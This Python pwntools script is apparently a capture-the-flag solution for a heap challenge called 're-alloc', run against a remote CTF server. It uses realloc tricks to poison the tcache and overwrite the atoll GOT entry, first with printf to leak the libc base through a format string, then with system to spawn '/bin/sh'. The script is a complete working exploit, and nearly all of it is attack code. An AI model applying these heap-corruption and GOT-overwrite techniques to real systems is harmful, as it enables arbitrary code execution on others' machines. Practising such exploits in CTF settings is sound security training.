#coding=utf-8
from pwn import *
local = 0
exec_file="./re-alloc"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("node3.buuoj.cn",26212)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x00040170C
    '''
    '''
    b *0x0040129A
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice: ",str(idx))

def add(idx,size,payload):
    menu(1)
    a.sendlineafter("Index:",str(idx))
    a.sendlineafter("Size:",str(size))
    a.sendlineafter("Data:",payload)
    return 

def delete(idx):
    menu(3)
    a.sendlineafter("Index:",str(idx))
    return 
    
def realloc(idx,size,content):
    menu(2)
    a.sendlineafter("Index:",str(idx))
    a.sendlineafter("Size:",str(size))
    if size:
        a.sendlineafter("Data:",content)
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33


add(0,0x58,"aaa")
realloc(0,0,"aaa")
realloc(0,0x58,p64(elf.got["atoll"]))#cover the next 
add(1,0x58,"aaa")
realloc(1,0x20,"bbb")
delete(0)
realloc(1,0x20,'a' * 0x10)
delete(1)

add(0,0x10,"aaa")
realloc(0,0,"aaa")
realloc(0,0x10,p64(elf.got["atoll"]))#cover the next 
add(1,0x10,"aaa")
realloc(1,0x40,"bbb")
delete(0)
#debug()
realloc(1,0x40,'a' * 0x10)
delete(1)

add(0,0x58,p64(elf.plt["printf"]))
menu(1)
a.sendlineafter("Index:","%6$p")
a.recvuntil("0x")
libc_base = int(a.recv(12),16) - libc.sym["_IO_2_1_stdout_"]
fuck(libc_base)#leak libc_base

menu(1)
a.sendafter("Index:","a")
a.sendafter("Size:",'a'*0x10)
a.sendlineafter("Data:",p64(libc_base + libc.sym["system"]))

menu(1)
a.sendafter("Index:","/bin/sh")
a.interactive()
